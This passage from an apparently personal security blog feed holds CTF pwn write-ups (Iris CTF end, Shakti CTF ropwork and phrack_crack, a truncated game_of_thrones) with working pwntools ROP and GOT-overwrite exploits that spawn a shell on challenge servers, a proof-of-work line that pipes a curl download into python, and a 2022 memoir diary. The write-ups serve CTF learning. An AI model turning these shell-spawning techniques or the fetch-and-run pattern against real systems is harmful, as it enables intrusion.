ret</span></span><br><span class="line">payload += p64(libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;yours?&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>In this CTF, Perhaps to prevent brute force, the following process is added when connecting to the server.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">== proof-of-work: enabled ==</span><br><span class="line">please solve a pow first</span><br><span class="line">You can run the solver with:</span><br><span class="line">    python3 &lt;(curl -sSL https://goo.gle/kctf-pow) solve s.ADQ6.AADPFiV0veQZlf8vJux482QM</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">Solution?</span><br></pre></td></tr></table></figure><p>And In this challenge, We can use onegadget. :-)</p><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">irisctf&#123;oh_its_ret2libc_anyway&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2022-12-31 Diary (2022 Memoir)</title>
      <link href="/221231-diary/"/>
      <url>/221231-diary/</url>
      
        <content type="html"><![CDATA[<p>Today is 2022’s last day. So, I’m writing a 2022 Memoir. :-D</p><h2 id="Graduated-University"><a href="#Graduated-University" class="headerlink" title="Graduated University"></a>Graduated University</h2><p>After completing BoB in the first half of the year, I returned to University. At the same time, I joined the company, so I didn’t go to University, but I devoted time to graduation assignments. I tended to go to University diligently during the past period. I always did my best to do my assignments or not be absent… etc. Going to University while working at the same time was harder than I thought. The hardest thing was to do graduation assignments. Still, thanks to the team members, I was able to finish my graduation assignments well and received the highest grade of A+. I’m very satisfied.</p><p>The content of graduation assignment is as follows. We proposed a market and developed a system to trade ultra-light food for single students or dormitory students attending our University. My role in the project was DB development and backend development. We use the Node JS for development.</p><p>I was able to successfully achieve my graduation in August by successfully obtaining the license(정보처리기사) for graduation within the deadline. I’m so glad. In fact, around the time I graduated, I formed a team as a University student and participated in the offline CTF. I placed on 6th in 2022 Hektheon Sejong 1st CTF. My role was Pwnable. I also worked hard to solve the problem, but in the end, I think I won the award thanks to other people.</p><h2 id="Joining-and-Leaving-the-company"><a href="#Joining-and-Leaving-the-company" class="headerlink" title="Joining and Leaving the company"></a>Joining and Leaving the company</h2><p>I joined an offensive research company in March of this year, a month before completing BoB. It was my first social life outside of University and BoB. I originally intended to organize my life in Seoul after completing BoB and go to the school dormitory to rest. However, the company gave me a good opportunity of assignments and interviews, so I worked hard and passed and joined the company. So, I remember canceling my University dormitory in a hurry. I thought attending a company was a much better opportunity for me than going back to University. I joined the company with such a hopeful mindset, but resigned in September.</p><p>There are many reasons for leaving the company, but one of them is to travel in search of a dream.(?) I felt cramped while going to the company, and even though I only went to the company for a short period of time, I didn’t think it was helpful. It has been about 3 months since I left. I am so happy now. I don’t think in a hurry and have time to spare, so I’m working on the computer with a more enjoyable mind than before. I really like myself for having this mindset.</p><h2 id="Demon-Team"><a href="#Demon-Team" class="headerlink" title="Demon Team"></a>Demon Team</h2><p>Demon team did a lot of things this year. Next year, I want to do a lot of useful and fresh things.</p><ol><li>Although the team name was not listed in the article, We participated in the CDDC 2022 program. My role in the program was prepared for basic English lectures on overall security. I remember preparing for about two months from April.</li></ol><ul><li>related article: <a href="https://www.dailysecu.com/news/articleView.html?idxno=137993&amp;fbclid=IwAR2qQR6MNc4djC_ACV__bc0kqmpdXiEW9P4rGU5VtwmZcv3kKd6iVn_d-58&amp;fs=e&amp;s=cl">https://www.dailysecu.com/news/articleView.html?idxno=137993&amp;fbclid=IwAR2qQR6MNc4djC_ACV__bc0kqmpdXiEW9P4rGU5VtwmZcv3kKd6iVn_d-58&amp;fs=e&amp;s=cl</a></li></ul><ol start="2"><li><p>I was prepared Chungbuk Hacking Camp system hacking lecture and Pwnable field of CTF. The CDDC above was an online lecture, but this Chungbuk Hacking Camp lecture was an offline. I remember being very nervous because it was my first offline presentation. It was disappointing that out of 20 high school students, there were only 1 or 2 students who focused more on Pwnable than expected. However, I felt fortunate that I prepared a really basic lecture. I remember that this was in July.</p></li><li><p>I gave a presentation of Summer Hacking camp. And I wrote a Pwanble challenge for the CTF held in there. The presentation was prepared with a senior from the previous company. I don’t remember exactly when, but I remember it was after the Hacking camp in Chungbuk. The topic of the presentation is my history of system hacking up to this point. I thought it was enough to share the experience because I completed BoB shortly after I started studying and joined the company right away. However, now I am confident that I have grown much more skillfully than I did back then. If there are good results in my personal research, I would like to make a presentation at Hacking Camp with technical content next time.</p></li><li><p>I wrote a Pwnable challenge for the Women’s Hacking Contest Power Of XX. There were two challenges each in the preliminaries and finals. In the finals, I wrote a one more challenge for Misk. This is November, and it is the time when I left the company. That’s why I had relatively more time, so I did a lot of research on the challenge, and I’m attached to it. Information on the challenge is attached below.</p></li></ol><ul><li><a href="https://jiravvit.github.io/221121-poxx2022-shop_revenge/">https://jiravvit.github.io/221121-poxx2022-shop_revenge/</a></li></ul><h2 id="New-beginnings-with-MacBook-Air-M2"><a href="#New-beginnings-with-MacBook-Air-M2" class="headerlink" title="New beginnings (with MacBook Air M2)"></a>New beginnings (with MacBook Air M2)</h2><p>After leaving the scompany, everything changed. I always hacked with an anxious and urgent mindset, but now I have a time to spare. It’s a fun and happy feeling. I received a MacBook as a gift this time, and I feel happier because I use it. Speaking of Mac, I have been using Windows, Linux, and Mac OS this year. I’ve been using Linux for about 3 months and Mac for about a month, but I like Mac the most. It is the prettiest and most sophisticated feeling.</p><p>Anyway, I’m happy to be able to greet 2023 with a new MacBook. I feel like I can live happily ever after. I will have to use my MacBook for the rest of my life! ;)</p><br><img src="/images/221231-diary/221231-mac.png" width="450"/>]]></content>
      
      
      <categories>
          
          <category> Diary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Diary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Shakti CTF 2022 - ropwork (hard)</title>
      <link href="/221222-shaktictf2022-ropwork/"/>
      <url>/221222-shaktictf2022-ropwork/</url>
      
        <content type="html"><![CDATA[<h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><p>(9&#x2F;387) solves</p><p>Hard</p><h3 id="description"><a href="#description" class="headerlink" title="description"></a>description</h3><p>The fisherman is trying to untangle his fishing knots. If you could help him with it, it would be great!</p><p>Note:<br>The server is running on Ubuntu 20.04<br>The flag file found on the server is given a random name.<br>Author: d1g174l_f0rtr355</p><h3 id="for-player"><a href="#for-player" class="headerlink" title="for player"></a>for player</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ropework_460328c6-afec-4492-9b9f-97a1f35c71af: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./ld-2.31.so, for GNU/Linux 3.2.0, BuildID[sha1]=8186a401dd45223b37552a01bd54666547a11437, not stripped</span><br></pre></td></tr></table></figure><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x3fd000)</span><br></pre></td></tr></table></figure><h3 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a>Source Code</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  system(<span class="string">&quot;echo &#x27;The fisherman is trying to untangle his fishing knots. If you could help him with it, it would be great!\n&#x27;&quot;</span>);</span><br><span class="line">  fgets(s, <span class="number">329</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  system(<span class="string">&quot;echo &#x27;Ok bye!\n&#x27;&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>대놓고 bof 터진다.</p><h2 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h2><p><code>fgets</code> 함수에서 변수 사이즈보다 더 큰 값을 쓸 수 있어서 bof가 터진다.</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h3 id="Exploit-Scenario"><a href="#Exploit-Scenario" class="headerlink" title="Exploit Scenario"></a>Exploit Scenario</h3><p>bss + 0x20 에다가 &#x2F;bin&#x2F;sh 써주고 system 함수 인자로 이걸 줘서 실행시켰다.</p><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./chall&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;65.2.136.80&#x27;</span>, <span class="number">31825</span>)</span><br><span class="line">libc = e.libc</span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line"></span><br><span class="line">xor_rax = <span class="number">0x401182</span></span><br><span class="line">pop_rdi = <span class="number">0x401273</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x401271</span></span><br><span class="line">xor_rdx_rbx = <span class="number">0x040118e</span></span><br><span class="line">syscall = <span class="number">0x4011a2</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x10</span>+<span class="number">0x8</span>)</span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rsi_r15) + p64(e.bss()+<span class="number">0x20</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(xor_rdx_rbx)</span><br><span class="line">payload += p64(xor_rax) <span class="comment"># sys_read</span></span><br><span class="line">payload += p64(syscall)</span><br><span class="line"></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x8</span></span><br><span class="line">payload += p64(e.sym[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x10</span>+ <span class="number">0x8</span>)</span><br><span class="line">payload += p64(pop_rdi) + p64(e.bss()+<span class="number">0x20</span>)</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(e.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="tmi"><a href="#tmi" class="headerlink" title="tmi"></a>tmi</h3><p>처음에 csu 가젯으로 문제를 풀려고 했었는데 뭔가 잘 안되어서 다른 방법 생각해보다가 문제를 풀었다. 역시.. 롸업은 문제 풀고 바로바로 작성해야 생생하게 적을 수 있는 것 같다.. (다시 풀긴.. 좀..) 이제 롸업 안미루고 잘 적을 것이다..</p><p>아 그리고 이 씨텝에서 롸업으로 적은 세 문제 말고 easy 2문제와 meduim 한 문제가 있었다. easy는 너무 쉬워서 롸업 업로드를 안하려고 한다. (솔브가 거의 60~70이다.) medium은 못풀었는데 연결리스트 구현 관련된 문제이다. 연결리스트가 뭔지 까먹어서.. ctf 기간 때 연결리스트 공부했던 기억이 난다.<br>아무튼 이 씨텝에서 포너블이 총 6개였는데 한 문제 빼고 다 풀어서 기분이 굉장히 좋았다. 남은 연결리스트 관련 문제는 결국 롸업을 봤는데 heap에서 unsafe-unlink라는 기법을 사용하여 익스를 하는 문제이다. 개인적으로 heap 관련 문제는 내가 heap을 공부를 제대로 안했기 때문에 풀지 않는다.(?????) 평생 안할 계획은 아니고 내년으로 미뤄둬야지.</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Shakti CTF 2022 - phrack_crack (hard)</title>
      <link href="/221222-shaktictf2022-phrack_crack/"/>
      <url>/221222-shaktictf2022-phrack_crack/</url>
      
        <content type="html"><![CDATA[<h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><p>(9&#x2F;387) solves</p><p>Hard</p><h3 id="description"><a href="#description" class="headerlink" title="description"></a>description</h3><p>phrack_phrack_phrack_crack_crack_crack.<br>Note: The server is running on Ubuntu 20.04.<br>Author: d1g174l_f0rtr355</p><h3 id="for-player"><a href="#for-player" class="headerlink" title="for player"></a>for player</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── ld.so.2</span><br><span class="line">├── libc.so.6</span><br><span class="line">└── phrack_crack</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phrack_crack: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./ld.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=06dd3b9850dc326bd98cb17e0049bcec4bd15219, not stripped</span><br></pre></td></tr></table></figure><p>ld와 libc가 주어졌으니 patchelf를 이용해서 패치해주고 문제풀이를 하였다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">linux-vdso.so.1 (0x00007ffc78b1f000)</span><br><span class="line">./libc.so.6 (0x00007f8d6e200000)</span><br><span class="line">./ld.so.2 =&gt; /usr/lib64/ld-linux-x86-64.so.2 (0x00007f8d6e69d000)</span><br></pre></td></tr></table></figure><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x3fd000)</span><br></pre></td></tr></table></figure><h3 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a>Source Code</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">=======================</span><br><span class="line"> | Welcome Phrack 66 |</span><br><span class="line">=======================</span><br><span class="line"></span><br><span class="line">Here&#x27;s a generous leak for you! 0x7fc34a06dba0</span><br><span class="line"></span><br><span class="line">Here&#x27;s one more generous leak for you: 0x961220</span><br><span class="line"></span><br><span class="line">MENU</span><br><span class="line"></span><br><span class="line">1. malloc 0/4</span><br><span class="line">2. edit</span><br><span class="line">3. target</span><br><span class="line">4. quit</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><p>원하는 사이즈만큼 힙에 데이터를 할당 가능하고.. 원하는 인덱스(?)에 내용을 수정 가능하다.</p><h2 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter index: &quot;</span>);</span><br><span class="line">  v5 = getint(<span class="number">8LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No negative indices allowed!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v3 &gt; <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;maximum requests reached!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !m_array[v5] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Index not allocated!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;data: &quot;</span>);</span><br><span class="line">  get_inp(m_array[v5], (<span class="type">unsigned</span> <span class="type">int</span>)(size + <span class="number">10</span>));</span><br></pre></td></tr></table></figure><p>인덱스를 입력받지만 정작 검증하는 인덱스는 엉뚱한 값이라서 oob가 발생한다. </p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h3 id="Exploit-Scenario"><a href="#Exploit-Scenario" class="headerlink" title="Exploit Scenario"></a>Exploit Scenario</h3><p>출력해주는 값을 통해 립시 베이스랑 힙 주소를 자연스럽게 알 수 있다.<br>1번 메뉴를 이용하여 힙을 할당한 다음 malloc got를 적어놓고 oob가 발생하니 malloc got가 써진 주소에 접근해서 2번 메뉴를 이용하여 malloc got를 system 주소로 덮을 수 있다.<br>그리고 다시 1번 메뉴를 이용하면 system으로 덮혀진 malloc이 실행될텐데 이때 인자를 우리의 입력값으로 조절할 수 있다. &#x2F;bin&#x2F;sh를 보내주면 성공.</p><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./chall&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;65.2.136.80&#x27;</span>, <span class="number">30930</span>)</span><br><span class="line">libc = e.libc</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">leak = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">info(<span class="built_in">hex</span>(leak))</span><br><span class="line"></span><br><span class="line">libc.address = leak - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">info(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">heap = <span class="built_in">int</span>(p.recvline(), <span class="number">16</span>)</span><br><span class="line">info(<span class="built_in">hex</span>(heap))</span><br><span class="line"></span><br><span class="line">heap = heap + <span class="number">0x10e0</span></span><br><span class="line">idx = (heap-<span class="number">0x4040c0</span>)//<span class="number">8</span></span><br><span class="line"><span class="built_in">print</span>(idx)</span><br><span class="line"></span><br><span class="line"><span class="comment"># malloc , malloc_got</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;size:&#x27;</span>, <span class="built_in">str</span>(<span class="number">10</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;data:&#x27;</span>, p64(<span class="number">0x404048</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># malloc_got -&gt; system</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;index:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.sendafter(<span class="string">&#x27;data:&#x27;</span>, p64(libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">binsh = <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;size:&#x27;</span>, <span class="built_in">str</span>(binsh))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="tmi"><a href="#tmi" class="headerlink" title="tmi"></a>tmi</h2><p>너무 늦게 롸업을 작성한다 ㅎ.. 개인적으로 문제 코드에 malloc이 나오면 긴장하는 편인데 바로 취약점을 찾고 생각보다 빠르게 익스했던 기억이 난다.</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> oob </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Shakti CTF 2022 - game_of_thrones (medium)</title>
      <link href="/221214-shaktictf2022-game_of_thrones/"/>
      <url>/221214-shaktictf2022-game_of_thrones/</url>
      
        <content type="html"><![CDATA[<h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><p>(10&#x2F;387) solves</p><p>MediumT</p><h3 id="description"><a href="#description" class="headerlink" title="description"></a>description</h3><p>Help capture king’s landing and defeat the night walkers and his army of the dead!<br>Note: The server is running on Ubuntu 20.04.<br>Author: d1g174l_f0rtr355</p><h3 id="for-player"><a href="#for-player" class="headerlink" title="for player"></a>for player</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── chall_dd0d7c74-c5fb-41f8-850f-2f82d6b6495c</span><br><span class="line">└── libc.so.6</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chall_dd0d7c74-c5fb-41f8-850f-2f82d6b6495c: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /glibc/2.27/64/lib/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=d246cab5927d94da0823f90a45d0373f433066ab, not stripped</span><br></pre></td></tr></table></figure><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h3><h3 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a>Source Code</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v3; <span class="comment">// [rsp+Fh] [rbp-1h]</span></span><br><span class="line"></span><br><span class="line">  initialize(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\n\n=================================================&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;|\tWelcome to Game of Thrones (GOT)\t|&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;=================================================\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;The goal is simple! You need to become the ruler of the seven kingdoms!&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      menu();</span><br><span class="line">      v3 = getchar();</span><br><span class="line">      getchar();</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="string">&#x27;3&#x27;</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      white_walkers(&amp;num_men, &amp;num_dragons);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="string">&#x27;3&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_10:</span><br><span class="line">      